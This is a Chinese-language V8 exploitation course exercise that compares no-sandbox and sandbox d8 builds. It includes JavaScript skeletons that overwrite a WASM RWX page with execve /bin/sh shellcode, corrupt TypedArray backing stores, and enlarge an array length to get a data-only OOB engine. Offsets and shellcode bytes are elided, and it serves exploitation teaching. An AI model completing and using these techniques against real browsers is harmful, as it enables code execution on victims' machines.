# 練習 F — 任意 R/W 到 code execution

> **目標**：把 Part 6 的知識落地。你已經有 cage 內任意讀寫（Part 3/練習 B），這個練習要你在**兩種 build** 上把它推向 code execution：在 **no-sandbox build** 上用經典手法拿到真正的執行；在 **sandbox build** 上親身撞牆、理解限制、改走 data-only。這是「古代 vs 現代」的對照實驗。

> **環境**：V8 15.3.0（candidate）、commit `ab2cad06`。需要兩顆 d8：`~/v8build/v8/out/x64.release/d8`（sandbox on）、`~/v8build/v8/out/x64.release.nosbx/d8`（off）。完整 exploit 需搭配一個給你任意讀寫的 challenge patch（延續練習 B/C）；**最終 code-exec 輸出標「未實測，理論預期」**，但每一步都對應你在 Part 6 用現行 d8 驗證過的機制（W^X、external pointer handle）。

## 背景與動機

Part 6 講了一堆「現代 code exec 很難」。光讀不夠——你要**親手在兩種環境各試一次**，才會真的懂那道牆有多硬。這個練習刻意設計成對照實驗：同一個起點（任意讀寫），在 no-sandbox build 上你能一路打到 shell（體會古代的爽快），在 sandbox build 上你會在同一步撞牆（體會現代的限制），然後被迫思考 data-only。

## 任務規格

**起點**：假設你已有以下原語（來自練習 B/C，或用 challenge patch 提供）：
- `read64(addr)` / `write64(addr, val)`：cage 內任意讀寫
- `addrof(obj)`：洩漏物件（壓縮）位址

| 目標 | no-sandbox build | sandbox build |
|---|---|---|
| A. WASM RWX code exec | **做到**：找 RWX 頁 → 覆寫 shellcode → 呼叫 | 說明**為什麼失敗**（W^X / code 間接化） |
| B. backing store 打穿進程 | **做到**：改 TypedArray backing store 指向任意位址，讀寫整個進程 | 說明**為什麼只能 cage 內**（external pointer handle） |
| C. data-only 目標 | （可選） | **做到**：純 cage 內，改一個陣列 length 放大 OOB，達成一個不需出 cage 的目的 |
| 驗收 | nosbx 上真正執行 shellcode（或至少跳到可控位址並用 gdb 確認） | 交一頁筆記：兩個手法各撞什麼牆、data-only 怎麼繞 |

> 這個練習的重點**不是**「一定要在 sandbox build 拿 shell」（那需要 sandbox escape，超出範圍）。重點是**對照理解限制**。

## 期望輸出範例

no-sandbox build（目標 A 成功）：

```
[nosbx] wasm rwx page @ 0x559a3c000000
[nosbx] shellcode written (execve /bin/sh)
[nosbx] calling wasm export...
$ id
uid=1000(ypp) ...
```

sandbox build（目標 A/B 撞牆，C 成功）：

```
[sbx] wasm code page pointer is indirect (not RWX) -> classic path blocked
[sbx] backing_store is a handle (0x...0007), write stays inside cage
[sbx] data-only: corrupted array length -> 0xffffffff, cage-internal OOB engine ready
```

## 如果你卡住了

1. **WASM RWX 在 nosbx 上找頁**：建一個最小 WASM instance，用 `%DebugPrint` 看 instance 物件，找到指向 code 的欄位；再用 `read64` 順藤摸到 RWX 頁。nosbx build 才有 RWX（sandbox build 沒有）。
2. **shellcode 別用 `system("/bin/sh")`**：真實 renderer 有 seccomp（[Ch 1](./01-why-renderer-attack-surface.md)）；但這是 d8、可直接 `execve`。用純位元組 shellcode 寫進 RWX 頁。
3. **sandbox build 撞牆是預期**：你會發現 (a) 找不到 RWX 頁（W^X），(b) 改了 backing store 的 handle 欄位也讀不到 cage 外——這正是要你體會的。別以為是自己寫錯。
4. **data-only 從改 length 開始**：在 cage 內用 `write64` 把一個 double 陣列的 length 欄位改成 `0xffffffff`，你就有了一台 cage 內的 OOB 讀寫引擎——這是最通用的 data-only 起點。
5. **驗證 W^X**：在 sandbox build 上把 code 頁位址（若找得到）用 `write64` 寫，會 crash（不可寫）——用 gdb 確認 fault 型別。

## 實作步驟建議

### Step 1（nosbx）：WASM RWX
建 WASM instance → `%DebugPrint` 找 code 欄位 → `read64` 定位 RWX 頁 → `write64` 覆寫 shellcode → 呼叫匯出函式。

### Step 2（nosbx）：backing store 打穿
偽造/改一個 TypedArray 的 backing store 指標為任意位址 → 直接讀寫整個進程（對照 sandbox build 的差異）。

### Step 3（sbx）：撞牆記錄
在 sandbox build 重跑 Step 1/2，記錄各在哪一步失敗、為什麼（對照 [Ch 32](./32-arbitrary-rw-to-code-exec.md)/[Ch 34](./34-v8-sandbox.md)）。

### Step 4（sbx）：data-only
純 cage 內，`write64` 改陣列 length → 放大 OOB → 達成一個 cage 內目的（例如穩定讀出另一個物件的 map、偽造一個物件）。

### Step 5：對照筆記
寫一頁：同一起點，兩 build 的終點差在哪、被哪些防禦分隔。

## 完整參考解答

**先自己在 nosbx 上打通 Step 1 再看。**

<details>
<summary>點開 WASM RWX（nosbx）與 data-only（sbx）參考骨架</summary>

**WASM RWX（no-sandbox build）**：

```js
// 前提：已有 read64/write64/addrof（練習 B/C）

// 1) 建最小 WASM module（一個什麼都不做的匯出函式），逼 V8 配置 RWX code
let wasm_bytes = new Uint8Array([
  0x00,0x61,0x73,0x6d, 0x01,0x00,0x00,0x00,  // magic + version
  // ... 一個含單一匯出函式 f 的最小 module（type/func/export/code section）
]);
let mod = new WebAssembly.Module(wasm_bytes);
let inst = new WebAssembly.Instance(mod);
let f = inst.exports.f;

// 2) 從 inst / f 物件順藤摸到 RWX code 頁位址
//    （用 %DebugPrint(inst) 看欄位，read64 逐層 follow 到 code entry）
let rwx = read64(/* addrof(f) + code entry 欄位 offset */);
print("[nosbx] rwx page @ 0x" + rwx.toString(16));

// 3) 把 shellcode 覆寫到 RWX 頁（execve("/bin/sh")）
let shellcode = [ /* x86-64 execve /bin/sh 位元組 */ ];
for (let i = 0; i < shellcode.length; i += 8) {
  write64(rwx + BigInt(i), /* 打包 8 bytes */);
}

// 4) 呼叫匯出函式 → 跳進 RWX 頁執行 shellcode
f();   // -> shell
```

**為什麼 sandbox build 這段失敗**（在你的筆記裡寫清楚）：
- Step 2 摸不到「RWX 頁」——sandbox build W^X 強制，WASM code 頁是 RX 不是 RWX，且 code 指標經 code pointer table 間接（[Ch 34](./34-v8-sandbox.md)），`read64`（cage 內）拿不到真正的 code 頁位址。
- 就算拿到，Step 3 的 `write64` 是 cage 內的，寫不到 cage 外的 code 頁。

**data-only（sandbox build）**：

```js
// 純 cage 內：把一個 double 陣列的 length 改巨大
let victim = [1.1, 2.2, 3.3, 4.4];
let len_addr = addrof(victim) /* + length 欄位 offset（%DebugPrint 抄）*/;
write64(len_addr, 0xffffffffn);   // length 欄位（注意壓縮/SMI 編碼）
// 現在 victim 是一台 cage 內 OOB 讀寫引擎，沿正常 JS 路徑運作
// 不碰任何 code 指標、不轉移控制流 -> CET/CFI 無從發揮，也不出 cage
print("[sbx] victim.length = " + victim.length);  // 巨大值
// 用它讀出相鄰物件的 map / 偽造物件，達成不需出 cage 的目的
```

**解答說明**：
- WASM RWX 在 nosbx 一步登天，正是 [Ch 33](./33-wasm-rwx-jit-spray.md) 的黃金招；sandbox build 上它死於 W^X + code 間接化。
- data-only 改 length 不碰控制流、不碰 code 指標、不出 cage——同時繞過 CET/CFI（[Ch 36](./36-cfi-cet-data-only.md)）**和** sandbox（[Ch 34](./34-v8-sandbox.md)）。這就是現代主流。
- length 欄位是 SMI 編碼（[Ch 3](./03-value-representation.md)），寫入時注意 `<<1` 與壓縮，`%DebugPrint` 抄真實 offset。

</details>

## 測試用例

| 測試 | build | 預期 |
|---|---|---|
| WASM instance 的 code 頁可寫 | nosbx | 是（RWX） |
| 同上 | sbx | 否（RX / 間接） |
| 改 backing store 指向 cage 外並讀 | nosbx | 讀到進程記憶體 |
| 同上 | sbx | 失敗 / 只在 cage 內 |
| 改 array length 為 0xffffffff | 兩者 | `arr.length` 變巨大，OOB 引擎就緒 |
| 呼叫覆寫後的 WASM 匯出 | nosbx | 執行 shellcode |

## 延伸挑戰（加分）

1. **完整 shellcode**：在 nosbx 上真的跑起 `execve("/bin/sh")`，用 gdb 確認落點。
2. **data-only 圖靈機**：只用 cage 內 OOB + addrof/fakeobj，實作一組穩定的「讀任意 cage 內位址、偽造任意物件」的 API，證明 data-only 的表達力。
3. **撞牆報告**：把 sandbox build 上每個經典手法失敗的**確切 fault**（用 gdb 抓 SIGSEGV/CET fault）記錄下來，寫成一份「V8 Sandbox/CET 擋了我什麼」的實測報告。
4. **想像 sandbox escape**：讀 [Ch 35](./35-bypassing-v8-sandbox.md)，寫下「如果要從 sandbox build 出 cage，我會從哪個未 cage 化的指標下手」的攻擊計畫（不必實作）。

## 自我檢核

- [ ] 能在 no-sandbox build 上把任意讀寫接到真正的 code execution
- [ ] 能說出 WASM RWX 手法在 sandbox build 上**確切**死在哪一步、為什麼
- [ ] 能解釋為什麼 sandbox build 的 backing store 寫入出不了 cage
- [ ] 能實作 data-only 的起手式（改 length 得 cage 內 OOB 引擎）
- [ ] 能說出 data-only 為什麼同時繞過 CET/CFI 和 V8 Sandbox

打完這個練習，你完整體會了「古代一步登天」和「現代層層設限」的差距。Part 6 收尾。接下來 Part 7 把整門課拉回真實戰場：CTF 題型、真實 Chrome 差異、full chain 全景，以及你的 final project。

→ [Ch 37 — CTF V8 題型全解](./37-ctf-v8-challenges.md)
